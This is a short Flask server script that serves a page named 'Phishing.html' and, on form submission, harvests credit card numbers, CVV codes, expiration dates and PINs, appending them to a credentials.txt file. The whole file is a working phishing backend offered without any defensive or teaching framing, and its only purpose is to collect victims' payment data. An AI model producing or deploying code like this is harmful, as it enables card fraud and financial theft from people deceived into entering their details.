from pathlib import Path
from flask import Flask, request, send_from_directory


BASE_DIR = Path(__file__).resolve().parent
HTML_FILE = "Phishing.html"

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
@app.route("/Phishing.html", methods=["GET", "POST"])
def show_page():
    if request.method == "POST":
        creditcard = request.form.get("CreditCard")
        csv = request.form.get("CSV")
        expiration = request.form.get("Expiration")
        pin = request.form.get("Pin")

        with open("credentials.txt", "a", encoding="utf-8") as f:
            f.write(f"Credit Card: {creditcard}\n")
            f.write(f"CSV: {csv}\n")
            f.write(f"Expiration: {expiration}\n")
            f.write(f"PIN: {pin}\n")
            f.write("-" * 20 + "\n")

    return send_from_directory(BASE_DIR, HTML_FILE)


if __name__ == "__main__":
    app.run(debug=True, port=5555)
